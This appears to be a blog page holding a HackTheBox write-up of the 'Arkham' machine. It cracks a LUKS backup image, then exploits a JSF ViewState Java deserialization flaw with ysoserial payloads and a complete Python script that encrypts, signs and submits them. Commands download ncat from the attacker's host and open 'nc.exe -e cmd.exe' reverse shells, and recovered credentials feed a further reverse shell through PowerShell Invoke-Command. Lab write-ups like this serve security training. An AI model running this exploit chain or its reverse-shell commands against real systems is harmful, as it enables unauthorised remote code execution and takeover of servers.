@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 18 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手 - Arkham - Java Deserialization Vuln" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 18</h1>
+          <p class="post-date">Posted <time datetime="2019-07-18">Jul 18, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="arkham">Arkham</h1>
+
+<p>Nmap Enum: 80, IIS, 135+139+445 SMB, 8080 Tomcat, 49666+49667 MSRPC</p>
+
+<h2 id="user">User</h2>
+
+<p>Try anomymously access the SMB, use <code>smbclient -U anonymous --no-pass //10.10.10.130/BatShare</code>, found a <code>appserv.zip</code>.</p>
+
+<p>Unarchive it, get <code>backup.img</code>, <code>file</code> check: <code>LUKS Encrypted v1[aes, xts-plain64, sha256] partition file</code>. Run <code>hashcat</code> with <code>rockyou</code>:</p>
+
+<pre><code class="language-bash">$ dd if=backup.img of=header.luks bs=512 count=4097
+$ hashcat --session rockhead1 -m 14600 -a 0 -w 3 ./header.luks /usr/share/wordlists/rockyou.txt -o luks_pwd.txt
+$ cat luks_pwd.txt
+batmanforever
+</code></pre>
+
+<p>Then Mount:</p>
+
+<pre><code class="language-bash">$ sudo cryptsetup open ./backup.img decrypted
+$ sudo mount /dev/mapper/decrypted /mnt/nfs1
+</code></pre>
+
+<p>From mounted files, you could find <code>tomcat-stuff</code> with a backup file <code>appserv.zip</code> , check it, found two params: <code>org.apache.myfaces.INIT_SECRET</code>, <code>org.apache.myfaces.MAC_SECRET</code></p>
+
+<p>So we know it is running JSF (JavaEE, already deprecated now). Check port 80, get IIS 10 Default Page, might be Windows server 2016+ (In fact it&rsquo;s 2019).</p>
+
+<p>Check port 8080, found <code>:8080/userSubscribe.faces</code>, as the config we just found in backup image, it is part of the application. All seems fine, input the form and submit, enable burp, you&rsquo;ll find a POST param called <code>javax.faces.Viewstate</code>, according to one of the referrence below, we know there&rsquo;s a deserialization RCE, review related source code and spec, we know: it is encrypted and encoded before submit. According to config, it is server-side process, so do some googlefu, found <code>ysoserial-modified</code>, use this program to generate payload:</p>
+
+<pre><code class="language-bash">$ java -jar ./ysoserial-modified.jar CommonsCollections5 powershell 'Invoke-WebRequest http://10.10.16.80:8080/ncat.exe -OutFile nc.exe' &gt; output_serialized_download_nc.bin
+$ java -jar ./ysoserial-modified.jar CommonsCollections5 cmd 'nc.exe 10.10.16.80 4488 -e cmd.exe' &gt; output_serialized_revshell.bin
+</code></pre>
+
+<p>According to code review, I wrote a script to help me finish the left stuff:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+# -*- encoding:utf-8 -*-
+#
+#  hackthebox_tool
+#  Copyright (C) 2019  kmahyyg
+#
+#  This program is free software: you can redistribute it and/or modify
+#  it under the terms of the GNU Affero General Public License as published by
+#  the Free Software Foundation, either version 3 of the License, or
+#  (at your option) any later version.
+#
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU Affero General Public License for more details.
+#
+#  You should have received a copy of the GNU Affero General Public License
+#  along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
+
+# http://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html
+
+# pip3 install pycryptodome requests
+
+from Crypto.Cipher import DES as DESCipher
+from Crypto.Hash import SHA1 as SHA1Sum
+from Crypto.Hash import HMAC as HMACCipher
+import base64
+import sys
+import requests
+
+# Utility function
+
+def print_help():
+    print(&quot;\n&quot;)
+    print('''
+    Download ysoserial from https://github.com/pimps/ysoserial-modified , Then:
+
+    java -jar ./ysoserial-modified.jar CommonsCollections5 powershell 'Invoke-WebRequest http://IP:PORT/ncat.exe -OutFile nc.exe' &gt; output_serialized_download_nc.bin
+    java -jar ./ysoserial-modified.jar CommonsCollections5 cmd 'nc.exe IP PORT -e cmd.exe' &gt; output_serialized_revshell.bin
+
+    After that, put this script in the same folder with payload , then run this script like this:
+
+    python3 ./encrypt_payload.py output_serialized_revshell.bin
+
+    It will tell you result.
+    ''')
+
+def pad(plain_bytes):
+    &quot;&quot;&quot;
+    func to pad cleartext to be multiples of 8-byte blocks.
+    If you want to encrypt a text message that is not multiples of 8-byte blocks,
+    the text message must be padded with additional bytes to make the text message to be multiples of 8-byte blocks.
+    &quot;&quot;&quot;
+    number_of_bytes_to_pad = INIT_BS - len(plain_bytes) % INIT_BS
+    ascii_string = chr(number_of_bytes_to_pad).encode()
+    padding_byte = number_of_bytes_to_pad * ascii_string
+    padded_plain_text =  plain_bytes + padding_byte
+    return padded_plain_text
+
+# Check user input validity
+
+try:
+    if not isinstance(sys.argv[1],str):
+        print(&quot;Payload not exist.&quot;)
+        print_help()
+        sys.exit(1)
+except:
+    print(&quot;Payload not exist.&quot;)
+    print_help()
+    sys.exit(1)
+
+
+PAYLOAD_BINARY = sys.argv[1]
+
+# Constant Variable according to Config
+
+INIT_SECRET = base64.b64decode(b&quot;SnNGOTg3Ni0=&quot;)
+INIT_MODE = DESCipher.MODE_ECB
+INIT_BS = DESCipher.block_size
+MAC_SECRET = base64.b64decode(b&quot;SnNGOTg3Ni0=&quot;)
+MYFACES_CHARSET = &quot;iso-8859-1&quot;
+
+# Load the payload in
+
+bindata = open(PAYLOAD_BINARY, 'rb').read()
+
+# Encrypt using DES-ECB-PKCS5
+
+engine1 = DESCipher.new(INIT_SECRET, INIT_MODE)
+pt1 = pad(bindata)
+enc1 = engine1.encrypt(pt1)
+
+# Sign with HMAC-SHA1
+
+engine2 = HMACCipher.new(MAC_SECRET, enc1, SHA1Sum)
+enc2 = engine2.digest()
+
+# Final Result
+
+finalr1 = base64.b64encode(enc1 + enc2)
+
+# HTTP POST Request - Data preparation
+
+postdt = {
+    &quot;j_id_jsp_1623871077_1:email&quot;:&quot;test1@test2.com&quot;,
+    &quot;j_id_jsp_1623871077_1:submit&quot;:&quot;SIGN UP&quot;,
+    &quot;j_id_jsp_1623871077_1_SUBMIT&quot;:&quot;1&quot;,
+    &quot;javax.faces.ViewState&quot;: finalr1.decode()
+}
+
+# HTTP POST Request - Send out
+
+r = requests.post(&quot;http://10.10.10.130:8080/userSubscribe.faces&quot;, data=postdt, timeout=10)
+print(&quot;HTTP Status Code: &quot; + str(r.status_code))
+print(&quot;Please check your webserver log or netcat to check result.&quot;)
+</code></pre>
+
+<p>Then you get the reverse shell after execute the script.</p>
+
+<p>User owned.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Grab your powershell, Check System Info using <code>Get-ComputerInfo</code>, Ouch: Windows Server 2019 Standard, so which means you don&rsquo;t need to try about any exploit here. Just go ahead, and find creds hidden in somewhere.</p>
+
+<p>Go to <code>downloads</code> of <code>alfred</code> user, found another <code>backup.zip</code>, get it downloaded, unarchive. <code>file</code> check, found an <code>ost</code> file: Microsoft Outlook Personal Folder Archive.</p>
+
+<p>Then <code>readpst ./alfred-otlk.pst -S -teajc</code> extract it, <code>draft/1-image-001.png</code>, find a screenshot of password <code>batman:Zx^#QZX+T!123</code> and <code>net</code> command (very useful).</p>
+
+<p>Then issue a powershell to get another shell:</p>
+
+<pre><code class="language-powershell">&gt; $username = &quot;$env:COMPUTERNAME\batman&quot;
+&gt; $password = &quot;Zx^#QZX+T!123&quot;
+&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+&gt; Invoke-Command -Credential $credential -ComputerName arkham -Command { cmd /k C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.16.80 3988 -e cmd.exe}
+</code></pre>
+
+<p>After you get another reverse shell, run <code>whoami /all</code>, you are now <code>batman</code> with local administrator permission. So you can choose to use <code>RunAs</code> verb for escalation(just like normally right click - Run as administrator).</p>
+
+<p>Here, issue <code>net use * \\10.10.10.130\C$</code> to mount C:\ at Z:\, then cmd to Z:\, you&rsquo;ll be able to read the root flag.</p>
+
+<p>(END)</p>
+
+<h1 id="referrence">Referrence</h1>
+
+<ul>
+<li><a href="https://nmap.org/book/nse-scripts-list.html">https://nmap.org/book/nse-scripts-list.html</a></li>
+<li><a href="https://blog.pnb.io/2018/02/bruteforcing-linux-full-disk-encryption.html">https://blog.pnb.io/2018/02/bruteforcing-linux-full-disk-encryption.html</a></li>
+<li><a href="https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_a_non-root_file_system">https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_a_non-root_file_system</a></li>
+<li><a href="https://github.com/Synacktiv-contrib/inyourface/blob/master/README">https://github.com/Synacktiv-contrib/inyourface/blob/master/README</a></li>
+<li><a href="https://github.com/pimps/ysoserial-modified">https://github.com/pimps/ysoserial-modified</a></li>
+<li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li>
+<li><a href="http://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html">http://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html</a></li>
+<li><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html</a></li>
+<li><a href="http://web.archive.org/web/20170708111726/https://wiki.apache.org/myfaces/Secure_Your_Application">http://web.archive.org/web/20170708111726/https://wiki.apache.org/myfaces/Secure_Your_Application</a></li>
+<li><a href="https://myfaces.apache.org/core22/myfaces-impl/webconfig.html">https://myfaces.apache.org/core22/myfaces-impl/webconfig.html</a></li>
+<li><a href="https://github.com/apache/myfaces/blob/master/impl/src/main/java/org/apache/myfaces/application/viewstate/StateUtils.java#L237">https://github.com/apache/myfaces/blob/master/impl/src/main/java/org/apache/myfaces/application/viewstate/StateUtils.java#L237</a></li>
+</ul>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup17/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 17</h2>
+    <p class="card-text">HackTheBox 练手 - Luke - JWT Enum - FreeBSD</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-07-18 718:00">Jul 18, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
